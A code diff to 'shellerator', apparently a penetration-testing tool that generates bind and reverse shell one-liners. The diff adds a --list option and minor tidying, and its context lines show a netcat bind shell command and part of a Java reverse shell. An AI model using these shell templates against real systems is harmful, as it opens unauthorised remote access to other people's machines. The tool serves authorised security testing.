@@ -80,8 +80,18 @@ def MENU_port():
     selection = menu_list[selection]
     return selection.split(' ')[1].replace('(', '').replace(')', '')
 
+def list_shells():
+    print('Reverse shells')
+    for shell in revshells.keys():
+        print('   - ' + shell)
+    print('\nBind shells')
+    for shell in bindshells.keys():
+        print('   - ' + shell)
+    quit()
+
 def get_options():
-    parser = argparse.ArgumentParser(description='Generate a bind/reverse shell')
+    parser = argparse.ArgumentParser(description='Generate a bind/reverse shell', formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument('-l', '--list', dest='LIST', action='store_true', help='Print all the types of shells shellerator can generate')
     # Can't choose bind shell and reverse shell
     shelltype = parser.add_mutually_exclusive_group()
     shelltype.add_argument('-b', '--bind-shell', dest='SHELLTYPE', action='store_const', const='bindshells', help='Generate a bind shell (you connect to the target)')
@@ -98,6 +108,8 @@ def get_options():
     revshell.add_argument('-i', '--ip', dest='LHOST', type=str, help='Listener IP address')
     revshell._group_actions.append(portoption)
     options = parser.parse_args()
+    if options.LIST:
+        list_shells()
     if options.SHELLTYPE == 'revshells' and not options.LHOST:
         options.LHOST = MENU_interface()
     if not options.LPORT:
@@ -108,7 +120,7 @@ def get_options():
         options.TYPE = MENU_shelltype(options.SHELLTYPE)
     return options
 
-# Helper function for populate_shells to add values to the dictionnaries
+# Helper function for populate_shells() to add values to the dictionnaries
 def add_shell(shells_dict, type, shell, notes=None):
     if not type in shells_dict.keys():
         shells = []
@@ -219,7 +231,6 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
     add_shell(bindshells, 'netcat', '''nc -lvp {LPORT} -e /bin/sh''')
 
 if __name__ == '__main__':
-    print()
     revshells = {}
     bindshells = {}
     populate_shells()
